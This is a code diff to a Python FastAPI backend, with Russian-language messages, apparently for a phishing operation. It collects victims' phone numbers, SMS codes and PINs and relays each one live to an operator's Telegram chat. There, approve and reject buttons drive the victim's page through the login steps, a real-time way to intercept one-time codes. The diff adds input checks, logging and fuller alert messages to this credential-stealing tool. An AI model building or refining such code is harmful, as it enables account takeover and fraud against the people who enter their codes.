@@ -62,9 +62,12 @@ class PinData(BaseModel):
 
 @asynccontextmanager
 async def lifespan(app: FastAPI):
-    webhook_url = f"{os.getenv('RENDER_EXTERNAL_URL', 'https://telegram-bot-gateway-1.onrender.com')}/webhook/callback"
+    # Устанавливаем вебхук
+    render_url = os.getenv("RENDER_EXTERNAL_URL", "https://telegram-bot-gateway-1.onrender.com")
+    webhook_url = f"{render_url}/webhook/callback"
     requests.post(f"{TELEGRAM_API_URL}/setWebhook", json={"url": webhook_url})
-    send_to_telegram(MY_CHAT_ID, "🤖 *Бот запущен*")
+    send_to_telegram(MY_CHAT_ID, "🤖 *Бот запущен* (с кнопками)")
+    logging.info(f"Webhook set to {webhook_url}")
     yield
     send_to_telegram(MY_CHAT_ID, "⚠️ Бот остановлен")
 
@@ -84,14 +87,29 @@ async def submit_phone(data: PhoneData):
     sid = data.session_id
     user_chat_id = data.user_chat_id
     
-    sessions[sid] = {"phone": phone, "user_chat_id": user_chat_id, "status": "waiting_code"}
-    send_to_telegram(MY_CHAT_ID, f"📞 *НОМЕР*\nСессия: `{sid}`\nНомер: `{phone}`")
+    if not phone or not sid:
+        raise HTTPException(status_code=400, detail="Не хватает данных")
+    
+    sessions[sid] = {
+        "phone": phone,
+        "user_chat_id": user_chat_id,
+        "status": "waiting_code"
+    }
+    
+    send_to_telegram(
+        MY_CHAT_ID,
+        f"📞 *НОВЫЙ НОМЕР*\n🆔 Сессия: `{sid}`\n📞 Номер: `{phone}`\n\nОжидается ввод SMS-кода..."
+    )
+    
     return {"status": "ok"}
 
 @app.post("/submit_code")
 async def submit_code(data: CodeData):
     sid = data.session_id
     code = data.code
+    
+    if not sid or not code:
+        raise HTTPException(status_code=400, detail="Не хватает данных")
     
     session = sessions.get(sid)
     if not session:
@@ -102,15 +120,19 @@ async def submit_code(data: CodeData):
     
     send_to_telegram(
         MY_CHAT_ID,
-        f"🔢 *ПРОВЕРКА КОДА*\nСессия: `{sid}`\nНомер: `{session['phone']}`\nКод: `{code}`",
+        f"🔢 *ПРОВЕРКА SMS-КОДА*\n🆔 Сессия: `{sid}`\n📞 Номер: `{session['phone']}`\n🔢 Код: `{code}`\n\nПодтвердите или отклоните код:",
         reply_markup=get_code_keyboard(sid)
     )
+    
     return {"status": "waiting_confirmation"}
 
 @app.post("/submit_pin")
 async def submit_pin(data: PinData):
     sid = data.session_id
     pin = data.pin
+    
+    if not sid or not pin:
+        raise HTTPException(status_code=400, detail="Не хватает данных")
     
     session = sessions.get(sid)
     if not session:
@@ -121,83 +143,94 @@ async def submit_pin(data: PinData):
     
     send_to_telegram(
         MY_CHAT_ID,
-        f"🔐 *ПРОВЕРКА PIN*\nСессия: `{sid}`\nНомер: `{session['phone']}`\nКод: `{session['code']}`\nPIN: `{pin}`",
+        f"🔐 *ПРОВЕРКА PIN-КОДА*\n🆔 Сессия: `{sid}`\n📞 Номер: `{session['phone']}`\n🔢 SMS-код: `{session['code']}`\n🔢 PIN: `{pin}`\n\nПодтвердите или отклоните PIN:",
         reply_markup=get_pin_keyboard(sid)
     )
+    
     return {"status": "waiting_confirmation"}
 
 @app.get("/check_status/{session_id}")
 async def check_status(session_id: str):
+    """Страница опрашивает этот эндпоинт каждые 2 секунды"""
     session = sessions.get(session_id)
     if not session:
         return {"status": "not_found"}
     
-    status = session.get("status", "unknown")
-    if status == "code_confirmed":
-        return {"status": "code_confirmed"}
-    elif status == "code_wrong":
+    current_status = session.get("status", "unknown")
+    
+    if current_status == "code_confirmed":
+        return {"status": "code_confirmed", "next_step": "pin"}
+    elif current_status == "code_wrong":
         return {"status": "code_wrong"}
-    elif status == "pin_confirmed":
-        return {"status": "pin_confirmed"}
-    elif status == "pin_wrong":
+    elif current_status == "pin_confirmed":
+        return {"status": "pin_confirmed", "next_step": "success"}
+    elif current_status == "pin_wrong":
         return {"status": "pin_wrong"}
     else:
-        return {"status": status}
+        return {"status": current_status}
 
 @app.post("/webhook/callback")
 async def handle_callback(request: Request):
-    data = await request.json()
+    """Обработка нажатий на кнопки в Telegram"""
+    try:
+        data = await request.json()
+        
+        if "callback_query" not in data:
+            return {"ok": True}
+        
+        callback = data["callback_query"]
+        callback_id = callback["id"]
+        data_str = callback["data"]
+        
+        # Парсим callback_data (формат: action_result_session_id)
+        parts = data_str.split("_")
+        if len(parts) < 3:
+            return {"ok": True}
+        
+        action = parts[0]  # code или pin
+        result = parts[1]   # ok или wrong
+        session_id = "_".join(parts[2:])
+        
+        session = sessions.get(session_id)
+        
+        if action == "code":
+            if result == "ok":
+                if session:
+                    session["status"] = "code_confirmed"
+                send_to_telegram(MY_CHAT_ID, f"✅ Код подтверждён для сессии {session_id}. Пользователь может вводить PIN.")
+            else:
+                if session:
+                    session["status"] = "code_wrong"
+                    user_chat_id = session.get("user_chat_id")
+                    if user_chat_id:
+                        send_to_telegram(str(user_chat_id), "❌ Неверный SMS-код. Попробуйте ещё раз.")
+                send_to_telegram(MY_CHAT_ID, f"❌ Код отклонён для сессии {session_id}.")
+        
+        elif action == "pin":
+            if result == "ok":
+                if session:
+                    session["status"] = "pin_confirmed"
+                    user_chat_id = session.get("user_chat_id")
+                    if user_chat_id:
+                        send_to_telegram(str(user_chat_id), "✅ PIN подтверждён! Добро пожаловать.")
+                send_to_telegram(MY_CHAT_ID, f"✅ PIN подтверждён для сессии {session_id}. Вход выполнен.")
+            else:
+                if session:
+                    session["status"] = "pin_wrong"
+                    user_chat_id = session.get("user_chat_id")
+                    if user_chat_id:
+                        send_to_telegram(str(user_chat_id), "❌ Неверный PIN-код. Попробуйте ещё раз.")
+                send_to_telegram(MY_CHAT_ID, f"❌ PIN отклонён для сессии {session_id}.")
+        
+        # Отвечаем на callback
+        requests.post(
+            f"{TELEGRAM_API_URL}/answerCallbackQuery",
+            json={"callback_query_id": callback_id, "text": "✅ Обработано"}
+        )
+        
+    except Exception as e:
+        logging.error(f"Callback error: {e}")
     
-    if "callback_query" not in data:
-        return {"ok": True}
-    
-    callback = data["callback_query"]
-    callback_id = callback["id"]
-    data_str = callback["data"]
-    
-    parts = data_str.split("_")
-    if len(parts) < 3:
-        return {"ok": True}
-    
-    action = parts[0]
-    result = parts[1]
-    session_id = "_".join(parts[2:])
-    
-    session = sessions.get(session_id)
-    
-    if action == "code":
-        if result == "ok":
-            if session:
-                session["status"] = "code_confirmed"
-            send_to_telegram(MY_CHAT_ID, f"✅ Код подтверждён для {session_id}")
-        else:
-            if session:
-                session["status"] = "code_wrong"
-                user_chat_id = session.get("user_chat_id")
-                if user_chat_id:
-                    send_to_telegram(str(user_chat_id), "❌ Неверный SMS-код. Попробуйте ещё раз.")
-            send_to_telegram(MY_CHAT_ID, f"❌ Код отклонён для {session_id}")
-    
-    elif action == "pin":
-        if result == "ok":
-            if session:
-                session["status"] = "pin_confirmed"
-                user_chat_id = session.get("user_chat_id")
-                if user_chat_id:
-                    send_to_telegram(str(user_chat_id), "✅ PIN подтверждён! Добро пожаловать.")
-            send_to_telegram(MY_CHAT_ID, f"✅ PIN подтверждён для {session_id}")
-        else:
-            if session:
-                session["status"] = "pin_wrong"
-                user_chat_id = session.get("user_chat_id")
-                if user_chat_id:
-                    send_to_telegram(str(user_chat_id), "❌ Неверный PIN-код. Попробуйте ещё раз.")
-            send_to_telegram(MY_CHAT_ID, f"❌ PIN отклонён для {session_id}")
-    
-    requests.post(
-        f"{TELEGRAM_API_URL}/answerCallbackQuery",
-        json={"callback_query_id": callback_id, "text": "Обработано"}
-    )
     return {"ok": True}
 
 if __name__ == "__main__":
